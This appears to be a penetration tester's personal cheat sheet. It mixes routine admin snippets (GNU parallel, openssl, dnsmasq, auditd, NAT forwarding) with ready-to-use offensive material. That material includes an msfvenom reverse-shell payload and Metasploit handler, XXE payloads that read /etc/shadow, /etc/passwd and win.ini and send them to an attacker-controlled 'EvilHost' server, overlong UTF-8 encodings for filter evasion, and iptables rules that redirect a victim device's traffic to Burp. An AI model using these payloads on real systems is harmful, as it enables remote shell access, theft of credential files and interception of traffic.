# Reference

Things I do all the time but can never remember.

## gnu parallel-ing gooder

```
taskset -c 0-10 parallel -j11 --resume --resume-failed --progress --joblog ~/Desktop/parallel-joblog --timeout 300 < todo.txt
```
saves progress to joblog so it can be control-C'd. taskset to leave a core free, timeout to kill long runningjobs (can also use % of average).
todo.txt has shell commands which will be run.



## metasploit rev shell (mips)

```
msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=192.168.50.1 LPORT=5555 -f elf > /tmp/shell2.elf


msfconsole
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set PAYLOAD linux/mipsbe/shell_reverse_tcp
PAYLOAD => linux/mipsbe/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.50.1
LHOST => 192.168.50.1
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > exploit


```


## One line cert gen
```
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt
```


## Dnsmasq-  DHCP only

```
dhcp-range=192.168.50.100,192.168.50.150,255.255.255.0,12h
dhcp-option=option:router,192.168.50.1
dhcp-option=option:dns-server,192.168.50.1
dhcp-authoritative
port=0
#remove the port line to run a dns server as well as dhcp
```


## XXE 
[See full list here](https://gist.github.com/staaldraad/01415b990939494879b4)

```
--------------------------------------------------------------
Vanilla, used to verify outbound xxe or blind xxe
--------------------------------------------------------------

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>

----------------------------------------------------------------
OoB (seems to work better against .NET)
----------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-----------------------------------------------------------------------
OoB extra ERROR -- Java
-----------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
## External dtd: ##

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%data3;">'> %param1; %external;


```

## Auditd

```
auditctl -l
auditctl -w /bin/ls -p x -k my_execs
ausearch -i -k my_execs
```
or

```
sudo forkstat -e exec
```


## Unicode
[Unicode Char transformations link](https://websec.github.io/unicode-security-guide/character-transformations/)

```
＇ fullwidth apos
＜ fullwidth lessthan
🎅 santa emoji


Target	NSF 1	NSF 2	NSF 3	Notes	
A	%C1%81	%E0%81%81	%F0%80%81%81	Latin A useful as a base test case.	
"	%C0%A2	%E0%80%A2	%F0%80%80%A2	Double quote	
'	%C0%A7	%E0%80%A7	%F0%80%80%A7	Single quote	
<	%C0%BC	%E0%80%BC	%F0%80%80%BC	Less-than sign	
>	%C0%BE	%E0%80%BE	%F0%80%80%BE	Greater-than sign	
.	%C0%AE	%E0%80%AE	%F0%80%80%AE	Full stop	
/	%C0%AF	%E0%80%AF	%F0%80%80%AF	Solidus	
\	%C1%9C	%E0%81%9C	%F0%80%81%9C	Reverse solidus

```

## Forwarding from one interface to the internet
```
# where eth2 is the device you want forwarded out, and eth0 is the internet attached adapter
iptables -A FORWARD -i eth2 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o eth2 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sysctl -w net.ipv4.ip_forward=1
```

## MITM transparent to burp
```

#Where eth2 is the target device, and eth0 is the NAT out to internet / reachable proxy server
# dont forget to run dns, transparent mode in burp, listen on external interface, disable firewall, sysctl -w <forwarding on thing> etc

iptables --table nat --append PREROUTING --in-interface eth2 --protocol tcp --dport 443 --jump DNAT --to 192.168.200.164:8080
iptables --table nat --append PREROUTING --in-interface eth2 --protocol tcp --dport 80 --jump DNAT --to 192.168.200.164:8080
iptables -A FORWARD -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 
```
